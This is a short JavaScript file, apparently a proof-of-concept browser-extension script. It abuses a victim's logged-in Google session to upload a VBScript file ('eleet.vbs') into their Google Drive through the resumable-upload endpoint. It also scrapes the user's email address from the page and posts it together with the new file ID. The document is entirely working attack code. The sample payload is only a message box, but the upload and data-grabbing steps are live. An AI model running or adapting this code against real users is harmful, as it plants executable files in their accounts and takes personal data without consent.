chrome.runtime.sendMessage('');

main();

async function main() {
 let ID = await uploadFile();
 let email = document.getElementsByClassName('gb_d gb_xa gb_A')[0].ariaLabel.split('(')[1].split(')')[0];
 window.postMessage({email: email, ID});
}

async function uploadFile() {

let payload = JSON.stringify({"protocolVersion":"0.8","createSessionRequest":{"fields":[{"external":{"name":"file","filename":"eleet.vbs","size":19}},{"inlined":{"name":"driveSourceClientService","content":"SaveButton","contentType":"text/plain"}},{"inlined":{"name":"driveSourceValue","content":"drive.google.com","contentType":"text/plain"}}]}});

let payloadContents = 'MsgBox("31337  :)")';

let sessionBody = await fetch("https://drive.google.com/upload/resumableuploadsc?authuser=0", {method: "POST", body: payload});
let sessionData = await sessionBody.json();

let uploadTarget = sessionData.sessionStatus.externalFieldTransfers[0].putInfo.cross_domain_url;

let gdriveBody = await fetch(uploadTarget, {method: "POST", body: payloadContents});
let gdriveData = await gdriveBody.json();

let gdriveID = gdriveData.sessionStatus.additionalInfo['uploader_service.GoogleRupioAdditionalInfo'].completionInfo.customerSpecificInfo.id;

return gdriveID;
}
